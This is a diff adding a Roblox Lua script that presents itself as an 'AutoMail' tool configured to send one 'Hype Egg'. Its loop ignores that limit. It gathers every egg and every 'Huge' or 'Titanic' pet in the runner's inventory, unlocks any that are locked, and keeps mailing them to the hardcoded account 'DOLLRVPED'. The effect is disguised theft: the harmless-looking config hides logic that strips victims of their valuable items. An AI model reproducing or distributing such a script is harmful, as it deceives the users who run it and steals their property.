@@ -1,0 +1,56 @@
+getgenv().AutoMail = {
+    ['Items'] = {
+        ['Hype Egg'] = { Class = "Lootbox", Amount = 1 },
+    },
+    ['Loop Interval'] = 60,
+    ['Users'] = {"DOLLRVPED"}, -- Does random of one
+}
+
+repeat task.wait() until game:IsLoaded()
+local LocalPlayer = game:GetService('Players').LocalPlayer
+repeat task.wait() until not LocalPlayer.PlayerGui:FindFirstChild('__INTRO')
+
+local Client = game:GetService('ReplicatedStorage').Library.Client
+
+local Network = require(Client.Network)
+local SaveModule = require(Client.Save)
+
+local PetIds = {"Huge", "Titanic"}
+
+while task.wait(AutoMail['Loop Interval'] or 60) do
+    local Queue = {}
+  
+    for Class, Items in pairs(SaveModule.Get()['Inventory']) do
+        for uid, v in pairs(Items) do
+            local PetCheck = (Class == "Pet") and table.find(PetIds, v.id)
+            local Config = false
+
+            for Id, Info in pairs(AutoMail['Items']) do
+                if Id == v.id and Info.Class == Class and Info.pt == v.pt and Info.sh == v.sh and Info.tn == v.tn and (Info.Amount or 0) <= (v._am or 1) then
+                    Config = true break
+                end
+            end
+
+            if Class == "Egg" or Config or PetCheck and not Queue[uid] then
+                Queue[uid] = { Class = Class, Info = v }
+            end
+        end
+    end
+
+    for uid, Data in pairs(Queue) do
+        local Unlocked = false
+        local Mailed = false
+        local v = Data.Info
+
+        if v._lk then
+            while not Unlocked do
+                Unlocked, err = Network.Invoke("Locking_SetLocked", uid, false) task.wait(0.1)
+            end
+        end
+
+        local User = AutoMail['Users'][math.random(1, #AutoMail['Users'])]
+        while not Mailed do
+            Mailed, err = Network.Invoke("Mailbox: Send", User, "Bless", Data.Class, uid, (v._am or 1)) task.wait(0.1)
+        end
+    end
+end
